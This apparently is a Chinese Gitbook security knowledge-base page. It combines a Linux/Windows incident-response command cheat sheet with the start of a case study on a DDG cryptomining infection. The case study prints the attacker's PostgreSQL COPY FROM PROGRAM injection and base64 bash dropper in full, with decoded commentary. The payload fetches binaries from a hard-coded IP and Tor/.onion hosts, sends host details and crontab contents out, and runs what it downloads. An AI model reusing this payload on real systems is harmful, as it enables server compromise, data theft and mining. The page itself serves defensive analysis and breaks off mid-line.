./ -ctime +1 -ctime -5 进程&&网络 top 使用top命令实时动态地查看系统的整体运行情况，主要分析CPU和内存的进程，是一个综合了多方信息监测系统性能和运行信息的实用工具 列名 含义 PID 进程ID，进程的唯一标识符 USER 进程所有者的实际用户名 PR 进程的调度优先级。这个字段的一些值是'rt'。这意味这这些进程运行在实时态 NI 进程的nice值（优先级）。越小的值意味着越高的优先级 VIRT 进程使用的虚拟内存 RES 驻留内存大小。驻留内存是任务使用的非交换物理内存大小 SHR SHR是进程使用的共享内存 S 这个是进程的状态。它有以下不同的值: D – 不可中断的睡眠态 R – 运行态 S – 睡眠态 T – 被跟踪或已停止 Z – 僵尸态 | | %CPU | 自从上一次更新时到现在任务所使用的CPU时间百分比 | | %MEM | 进程使用的可用物理内存百分比 | | TIME+ | 任务启动后到现在所使用的全部CPU时间，精确到百分之一秒 | | COMMAND | 运行进程所使用的命令 | htop netstat netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况 -a 显示所有连线中的Socket。 -n 直接使用IP地址，而不通过域名服务器。 -t 显示TCP传输协议的连线状况。 -u 显示UDP传输协议的连线状况。 -l 显示侦听服务器套接字 -v 显示指令执行过程。 -p 显示正在使用Socket的程序PID和程序名称。 -s 显示网络工作信息统计表。 ps 查看进程 a 显示一个终端的所有进程，除会话引线外 u 显示进程的归属用户及内存的使用情况 x 显示没有控制终端的进程 -l 长格式显示更加详细的信息 -e 显示所有进程 -f 执行完整格式列表 \"ps aux\" 可以查看系统中所有的进程； \"ps -le\" 可以查看系统中所有的进程，而且还能看到进程的父进程的 PID 和进程优先级； \"ps -l\" 只能看到当前 Shell 产生的进程 ps aux 列名 含义 USER 该进程是由哪个用户产生的。 PID 进程的 ID。 %CPU 该进程占用 CPU 资源的百分比，占用的百分比越高，进程越耗费资源。 %MEM 该进程占用物理内存的百分比，占用的百分比越高，进程越耗费资源。 VSZ 该进程占用虚拟内存的大小，单位为 KB。 RSS 该进程占用实际物理内存的大小，单位为 KB。 TTY 该进程是在哪个终端运行的。其中，tty1 ~ tty7 代表本地控制台终端（可以通过 Alt+F1 ~ F7 快捷键切换不同的终端），tty1~tty6 是本地的字符界面终端，tty7 是图形终端。pts/0 ~ 255 代表虚拟终端，一般是远程连接的终端，第一个远程连接占用 pts/0，第二个远程连接占用 pts/1，依次増长。 STAT 进程状态。常见的状态有以下几种： -D：不可被唤醒的睡眠状态，通常用于 I/O 情况。 -R：该进程正在运行。 -S：该进程处于睡眠状态，可被唤醒。 -T：停止状态，可能是在后台暂停或进程处于除错状态。 -W：内存交互状态（从 2.6 内核开始无效）。 -X：死掉的进程（应该不会出现）。 -Z：僵尸进程。进程已经中止，但是部分程序还在内存当中。 - \"ps aux\"命令可以看到系统中所有的进程，\"ps -le\"命令也能看到系统中所有的进程。由于 \"-l\" 选项的作用，所以 \"ps -le\" 命令能够看到更加详细的信息，比如父进程的 PID、优先级等。但是这两个命令的基本作用是一致的，掌握其中一个就足够了。 ps -le 列名 含义 USER 该进程是由哪个用户产生的。 PID 进程的 ID。 %CPU 该进程占用 CPU 资源的百分比，占用的百分比越高，进程越耗费资源。 %MEM 该进程占用物理内存的百分比，占用的百分比越高，进程越耗费资源。 VSZ 该进程占用虚拟内存的大小，单位为 KB。 RSS 该进程占用实际物理内存的大小，单位为 KB。 TTY 该进程是在哪个终端运行的。其中，tty1 ~ tty7 代表本地控制台终端（可以通过 Alt+F1 ~ F7 快捷键切换不同的终端），tty1~tty6 是本地的字符界面终端，tty7 是图形终端。pts/0 ~ 255 代表虚拟终端，一般是远程连接的终端，第一个远程连接占用 pts/0，第二个远程连接占用 pts/1，依次増长。 STAT 进程状态。常见的状态有以下几种： -D：不可被唤醒的睡眠状态，通常用于 I/O 情况。 -R：该进程正在运行。 -S：该进程处于睡眠状态，可被唤醒。 -T：停止状态，可能是在后台暂停或进程处于除错状态。 -W：内存交互状态（从 2.6 内核开始无效）。 -X：死掉的进程（应该不会出现）。 -Z：僵尸进程。进程已经中止，但是部分程序还在内存当中。 - pstree pstree [选项] [PID或用户名] -a 显示启动每个进程对应的完整指令，包括启动进程的路径、参数等。 -c 不使用精简法显示进程信息，即显示的进程中包含子进程和父进程。 -n 根据进程 PID 号来排序输出，默认是以程序名排序输出的。 -p 显示进程的 PID。 -u 显示进程对应的用户名称。 在使用 pstree 命令时，如果不指定进程的 PID 号，也不指定用户名称，则会以 init 进程为根进程，显示系统中所有程序和进程的信息；反之，若指定 PID 号或用户名，则将以 PID 或指定用户为根进程，显示 PID 或用户对应的所有程序和进程 lsof lsof 命令，“list opened files”的缩写，直译过来，就是列举系统中已经被打开的文件。通过 lsof 命令，我们就可以根据文件找到对应的进程信息，也可以根据进程信息找到进程打开的文件 -c 字符串 只列出以字符串开头的进程打开的文件。 +d 目录名 列出某个目录中所有被进程调用的文件。 -u 用户名 只列出某个用户的进程打开的文件。 -p pid 列出某个 PID 进程打开的文件。 隐藏进程 cat /proc/$$/mountinfo cat /proc/mounts mount 使用mount隐藏进程，可以发现挂载硬盘之后，ps查看进程是无法查看对应的进程详细信息 查看对应挂载信息，可以快速找到隐藏的进程pid 然后使用unmount 取消挂载之后，就可以kill掉这个进程 日志 CentOS系统日志文件重要日志 日志文件 说 明 /var/log/cron 记录与系统定时任务相关的曰志 /var/log/cups/ 记录打印信息的曰志 /var/log/dmesg 记录了系统在开机时内核自检的信总。也可以使用dmesg命令直接查看内核自检信息 /var/log/btmp 记录错误登陆的日志。这个文件是二进制文件，不能直接用Vi查看，而要使用lastb命令查看。命令如下： [root@localhost log]#lastb root tty1 Tue Jun 4 22:38 - 22:38 (00:00) # 有人在6月4 日 22:38便用root用户在本地终端 1 登陆错误 | | /var/log/lasllog | 记录系统中所有用户最后一次的登录时间的曰志。这个文件也是二进制文件.不能直接用Vi 查看。而要使用lastlog命令查看 | | /var/Iog/mailog | 记录邮件信息的曰志 | | /var/log/messages | 它是核心系统日志文件，其中包含了系统启动时的引导信息，以及系统运行时的其他状态消息。I/O 错误、网络错误和其他系统错误都会记录到此文件中。其他信息，比如某个人的身份切换为 root，已经用户自定义安装软件的日志，也会在这里列出。 | | /var/log/secure | 记录验证和授权方面的倍息，只要涉及账户和密码的程序都会记录，比如系统的登录、ssh的登录、su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 | | /var/log/wtmp | 永久记录所有用户的登陆、注销信息，同时记录系统的后动、重启、关机事件。同样，这个文件也是二进制文件.不能直接用Vi查看，而要使用last命令查看 | | /var/tun/ulmp | 记录当前已经登录的用户的信息。这个文件会随着用户的登录和注销而不断变化，只记录当前登录用户的信息。同样，这个文件不能直接用Vi查看，而要使用w、who、users等命令查看 | 服务日志 除系统默认的日志之外，采用 RPM 包方式安装的系统服务也会默认把日志记录在 /var/log/ 目录中（源码包安装的服务日志存放在源码包指定的目录中）。不过这些日志不是由 rsyslogd 服务来记录和管理的，而是各个服务使用自己的日志管理文档来记录自身的日志。以下介绍的日志目录在你的 Linux 上不一定存在，只有安装了相应的服务，日志才会出现。 日志文件 说明 /var/log/httpd/ RPM包安装的apache取务的默认日志目录 /var/log/mail/ RPM包安装的邮件服务的额外日志因录 /var/log/samba/ RPM包安装的Samba服务的日志目录 /var/log/sssd/ 守护进程安全服务目录 Windows 文件 C:\\Documents and Settings\\Administrator\\Recent C:\\Documents and Settings\\Default User\\Recent %UserProfile%\\Recent 文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件 下载目录 回收站文件 程序临时文件 历史文件记录 应用程序打开历史 搜索历史 快捷方式（LNK） c:\\windows\\temp\\ Window 2003 C:\\Documents and Settings Window 2008R2 C:\\Users\\ Temp/tmp目录 开始-运行，输入%UserProfile%\\Recent HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunonceEx (ProfilePath)\\Start Menu\\Programs\\Startup 启动项 msconfig 启动选项卡 gpedit.msc 组策略编辑器 开始>所有程序>启动 msconfig-启动 C:\\Windows\\System32\\Tasks\\ C:\\Windows\\SysWOW64\\Tasks\\ C:\\Windows\\tasks\\ schtasks taskschd.msc at 开始-设置-控制面板-任务计划 进程 && 网络 tasklist /svc | findstr pid netstat -ano tasklist /svc findstr wmic process | find \"Proccess Id\" > proc.csv Get-WmiObject -Class Win32_Process Get-WmiObject -Query \"select * from win32_service where name='WinRM'\" -ComputerName Server01, Server02 | Format-List -Property PSComputerName, Name, ExitCode, Name, ProcessID, StartMode, State, Status wmic process get caption,commandline /value wmic process where caption=”svchost.exe” get caption,commandline /value wmic service get name,pathname,processid,startname,status,state /value wmic process get CreationDate,name,processid,commandline,ExecutablePath /value wmic process get name,processid,executablepath| findstr \"7766\" netstat 详情 状态 说明 CLOSED 无连接活动或正在进行 LISTEN 监听中等待连接 SYN_RECV 服务端接收了SYN SYN_SENT 请求连接等待确认 ESTABLISHED 连接建立数据传输 FIN_WAIT1 请求中止连接，等待对方FIN FIN_WAIT2 同意中止，请稍候 ITMED_WAIT 等待所有分组死掉 CLOSING 两边同时尝试关闭 TIME_WAIT 另一边已初始化一个释放 LAST_ACK 等待原来的发向远程TCP的连接中断请求的确认 CLOSE-WAIT 等待关闭连接 日志 开审核策略 系统日志，程序日志，安全日志 eventvwr.msc 1）服务器日志： FTP连接日志和HTTPD事务日志： %systemroot%\\system32\\LogFiles\\ IIS日志默认存放在System32\\LogFiles目录下，使用W3C扩展格式 2）操作系统日志： LogParser.exe是微软提供的日志分析工具 登录成功的所有事件： LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4624\" 指定登录时间范围的事件： LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where TimeGenerated>'2018-06-19 23:32:11 and TimeGenerated 提取登录成功的用户名和IP： LogParser.exe -i:EVT –o:DATAGRID \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\\Security.evtx where EventID=4624\" 登录失败的所有事件： LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4625\" 提取登录失败用户名进行聚合统计： LogParser.exe -i:EVT \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message\" 系统历史开关机记录： LogParser.exe -i:EVT –o:DATAGRID \"SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006\" Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:12:30 "},"知识库/03.主机安全/21.Linux应急响应案例（DDG挖矿）.html":{"url":"知识库/03.主机安全/21.Linux应急响应案例（DDG挖矿）.html","title":"21.Linux应急响应案例（DDG挖矿）","keywords":"","body":"背景 第一次出现是在2020年9月14日晚上接近8点，10.100.244.24,10.100.244.22两台服务器出现cpu异常，tracepath一直在内网扫描且为tcp连接，这两台服务器除了tracepath进程在大规模扫描以外，还有另外的进程占cpu高的进程。 tracepath 指令可以追踪数据到达目标主机的路由信息，它使用UDP协议 tracepath [ -n] [ -l pktlen] destination [ port] 参数 说明 -n 不查看主机名字 -l 设置初始化数据包长度，默认65535 tracepath 扫描 tcp 扫描内网的5432端口（5432默认是PostgreSQL） # root 权限 netstat -antulp 应急过程 查看文件的状态 # 查看创建，更新 stat /usr/bin/tracepath md5sum /usr/bin/tracepath 查找定时任务，本地脚本 # 列出某个用户cron服务的详细内容 crontab -l # 默认编写的 crontab文件会保存在/var/spool/cron/$USER cat /etc/crontab cat /etc/cron.*/XXX # 异步定时服务 cat /etc/anacrontab # 具体文件 /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* user=postgres hostaddr=%s password=%s^@DROP TABLE IF EXISTS abroxu;CREATE TABLE abroxu(cmd_output text);COPY abroxu FROM P ROGRAM 'echo WFJBTkRPTQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYW wvc2JpbgoKZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhdGggPDw8JChlY2hvICR7MS8vLy8gfSkKICBET0M9LyR7cGF0aC8vIC8vfQogIEhPU1Q9JHtzZXJ2ZXIvLzoqf QogIFBPUlQ9JHtzZXJ2ZXIvLyo6fQogIFtbIHgiJHtIT1NUfSIgPT0geCIke1BPUlR9IiBdXSAmJiBQT1JUPTgwCgogIGV4ZWMgMzw+L2Rldi90Y3AvJHtIT1NUfS8kUE9SVAogIGVjaG8gLWVuICJH RVQgJHtET0N9IEhUVFAvMS4wXHJcbkhvc3Q6ICR7SE9TVH1cclxuXHJcbiIgPiYzCiAgKHdoaWxlIHJlYWQgbGluZTsgZG8KICAgW1sgIiRsaW5lIiA9PSAkJ1xyJyBdXSAmJiBicmVhawogIGRvbmU gJiYgY2F0KSA8JjMKICBleGVjIDM+Ji0KfQoKY3VybCAtViB8fCBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IC15IGluc3RhbGwgY3VybApjdXJsIC1WIHx8IHl1bSAteSBpbnN0YWxsIGN1cmwKY3 VybCAtViB8fCB3Z2V0IC1xIGh0dHBzOi8vZ2l0aHViLmNvbS9tb3BhcmlzdGhlYmVzdC9zdGF0aWMtY3VybC9yZWxlYXNlcy9kb3dubG9hZC92Ny43MS4xL2N1cmwtYW1kNjQgLU8gL3Vzci9sb2Nhb C9iaW4vY3VybDtjaG1vZCAreCAvdXNyL2xvY2FsL2Jpbi9jdXJsCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMv ZG93bmxvYWQvdjcuNzEuMS9jdXJsLWFtZDY0IC1PICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApjdXJsIC1WIHx8IF9fY3VybCBodHRwOi8vMTIwLjI3LjI2LjE4OTo4MS9jdXJsID4gL3V zci9sb2NhbC9iaW4vY3VybDtjaG1vZCAreCAvdXNyL2xvY2FsL2Jpbi9jdXJsCmN1cmwgLVYgfHwgX19jdXJsIGh0dHA6Ly8xMjAuMjcuMjYuMTg5OjgxL2N1cmwgPiAkSE9NRS9jdXJsO2NobW9kIC t4ICRIT01FL2N1cmwKCmQ9JChncmVwIHg6JChpZCAtdSk6IC9ldGMvcGFzc3dkfGN1dCAtZDogLWY2KQpjPSQoZWNobyAiY3VybCAtNGZzU0xrQS0gLW0yMDAiKQp0PSQoZWNobyAibnNzbmtjdDZ1Z Hl5eDZ6bHY0bDZqaHFyNWpkZjY0M3NoeWVyazI0NmZzMjdrc3JkZWhsMnozcWQiKQoKc29ja3ooKSB7Cm49KGRvaC5kZWZhdWx0cm91dGVzLmRlIGRucy5ob3N0dXgubmV0IGRucy5kbnMtb3Zlci1o dHRwcy5jb20gdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJ sYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbW U9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMykpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJ yAnXG4nfHNvcnQgLXVSfGhlYWQgLTEpCn0KCmZleGUoKSB7CmZvciBpIGluIC4gJEhPTUUgL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAk aS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9wZy4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSk Kcj0kKGN1cmwgLTRmc1NMayBjaGVja2lwLmFtYXpvbmF3cy5jb218fGN1cmwgLTRmc1NMayBpcC5zYilfJCh3aG9hbWkpXyQodW5hbWUgLW0pXyQodW5hbWUgLW4pXyQoaXAgYXxncmVwICdpbmV0IC d8YXdrIHsncHJpbnQgJDInfXxtZDVzdW18YXdrIHsncHJpbnQgJDEnfSlfJChjcm9udGFiIC1sfGJhc2U2NCAtdzApCiRjIC14IHNvY2tzNWg6Ly8kczo5MDUwICR0Lm9uaW9uJGYgLW8keCAtZSRyI Hx8ICRjICQxJGYgLW8keCAtZSRyCmNobW9kICt4ICR4OyR4O3JtIC1mICR4Cn0KCmZvciBoIGluIHRvcjJ3ZWIuaW4gdG9yMndlYi5pdCB0b3Iyd2ViLmlvIHRvcjJ3ZWIuc3Ugb25pb24uY29tLmRl CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC0xIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXM7IHRoZW4KdSAkdC4kaAplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash';SELECT * FROM abro xu;DROP TABLE IF EXISTS abroxu; # 解码 user=postgres hostaddr=%s password=%s^@DROP TABLE IF EXISTS abroxu;CREATE TABLE abroxu(cmd_output text);COPY abroxu FROM P ROGRAM echo 'XRANDOM exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin xec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin function __curl() { # ${1//// }将/ 替换为空格 read proto server path /dev/tcp/${HOST}/$PORT echo -en \"GET ${DOC} HTTP/1.0\\r\\nHost: ${HOST}\\r\\n\\r\\n\" >&3 (while read line; do [[ \"$line\" == $'\\r' ]] && break done && cat) &- } curl -V || apt-get update && apt-get -y install curl curl -V || yum -y install curl curl -V || wget -q https://github.com/moparisthebest/static-curl/releases/download/v7.71.1/curl-amd64 -O /usr/local/bin/curl;chmod +x /usr/local/bin/curl curl -V || wget -q https://github.com/moparisthebest/static-curl/releases/download/v7.71.1/curl-amd64 -O $HOME/curl;chmod +x $HOME/curl # 下载curl 重定向到/usr/local/bin/curl 目录下 赋予执行权限 curl -V || __curl http://120.27.26.189:81/curl > /usr/local/bin/curl;chmod +x /usr/local/bin/curl curl -V || __curl http://120.27.26.189:81/curl > $HOME/curl;chmod +x $HOME/curl # id -u (uid) grep x:$uid: /etc/passwd => 取出当前用户 # cut -d: -f6 => -d: 以:为分界符，-f --fields 选中的列表，-f6 指 第6列，为用户的家目录 # $d = 当前用户的家目录 /home/aaron d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) # 获取家目录 c=$(echo \"curl -4fsSLkA- -m200\") # curl -4fsSLkA- -m200 t=$(echo \"nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd\") # 输出字符串，用于拼接后面的Tor网络地址 #dns 解析函数 sockz() { n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \"dns-query?name=relay.tor2socks.in\") s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) } # 执行exit fexe() { for i in . $HOME /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done } u() { sockz fexe f=/pg.$(uname -m) x=./$(date|md5sum|cut -f1 -d-) r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) $c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r chmod +x $x;$x;rm -f $x } for h in tor2web.in tor2web.it tor2web.io tor2web.su onion.com.de do if ! ls /proc/$(head -1 /tmp/.X11-unix/01)/status; then u $t.$h else break fi done '; SELECT * FROM abroxu;DROP TABLE IF EXISTS abroxu # Parameter Expansion ${parameter/pattern/string} ${parameter//pattern/string} ${parameter/pattern} ${parameter//pattern} #（1）parameter之后如果是/，则只替换匹配到的第一个子串；parameter之后如果是//，则替换所有匹配到的子串。 #（2）当string为空时，则相当于将匹配的子串删除。 #（3）特殊符号#和%在这种情况下分别锚定（Anchoring ）字符串的开始和结尾。 #（4）如果bash的nocasematch选项参数是打开的（shopt -s nocasematch），则匹配的过程大小写是不敏感的。 psql中 copy命令 -- 导入,从 'command'中导入到table中 COPY table_name [ ( column_name [, ...] ) ] FROM { 'filename' | PROGRAM 'command' | STDIN } [ [ WITH ] ( option [, ...] ) ] 应急流程 排查定时任务 制作该服务器快照，判断是否与tracepath命令相关 删除计划任务中调用的各种脚本文件，并及时卸载curl命令 针对外连IP，对ip出口进行限制，让其无法访问 清除守护进程第二次应急 第二次出现是在2020年9月15日，中午12点，10.100.249.188，cpu异常，登录服务器，查看在/opt目录下存在同样的systemd-service.sh文件，在/etc/cron.d同样存在以root用户启动的定时任务，按照昨日的应急流程走了一遍，本以为没问题了，但是过了一会病毒又上线，/opt目录下存在了新的脚本文件，/etc/cron.d目录下也存在新的定时任务，且脚本的系统时间均被修改 使用gdb attach 找到已知的pid，dump出当前进程的内存，进而进行分析 QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK # 屏蔽指定进程终端上的标准输出信息 exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin # id -u (uid) grep x:$uid: /etc/passwd => 取出当前用户 # cut -d: -f6 => -d: 以:为分界符，-f --fields 选中的列表，-f6 指 第6列，为用户的家目录 # $d = 当前用户的家目录 /home/aaron d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) x() { # 当家目录不存在.systemd-service.sh, 执行 || 后的文件重定向命令 写入家目录下的.systemd-service.sh if ! ls $d/.systemd-service.sh; then [ -s $d/.systemd-service.sh ] || echo -e \"#\\x21/bin/bash\\nexec &>/dev/null\\necho QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK\\necho UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash\" > $d/.systemd-service.sh # base64 解码函数 #QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK #exec &>/dev/null #export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin #d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) # 获取家目录 #c=$(echo \"curl -4fsSLkA- -m200\") # curl -4fsSLkA- -m200 #t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") # 输出字符串，用于拼接后面的Tor网络地址 #dns 解析函数 #sockz() { #n=( # doh.defaultroutes.de # dns.hostux.net # dns.dns-over-https.com # uncensored.lux1.dns.nixnet.xyz # dns.rubyfish.cn # dns.twnic.tw # doh.centraleu.pi-dns.com # doh.dns.sb # doh-fi.blahdns.com # fi.doh.dns.snopyta.org # dns.flatuslifir.is # doh.li # dns.digitale-gesellschaft.ch #) #p=$(echo \"dns-query?name=relay.tor2socks.in\") # $((RANDOM%13))) 产生 0-12的随机数 ${n[$((RANDOM%13))]} => n[random] 用于解析 # 获取relay.tor2socks.in的IP地址 #s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) #} # 执行exit #fexe() { #for i in /dev/shm /usr/bin $d /tmp /var/tmp # do # echo exit > $i/i # chmod +x $i/i # cd $i # ./i # rm -f i # break # done #} #u() { #sockz #fexe #f=/int.$(uname -m) => /int.x86_64 #x=./$(date|md5sum|cut -f1 -d-) => 获取当前时间时间戳MD5值 # $r => 输出本机相关信息及计划任务 #r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) #$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r # curl -4fsSLkA- -m200 -x socks5h://xxx_ip:9050 $t.onion/int.x86_64/ -o ./md5(dateTime) -e 本机相关信息 || curl -4fsSLkA- -m200 $t.$h/int.x86_64 -o ./md5(dateTime) -e 本机相关信息 # 给下载下来的脚本添加执行权限，执行该脚本，再删除该脚本 #chmod +x $x;$x;rm 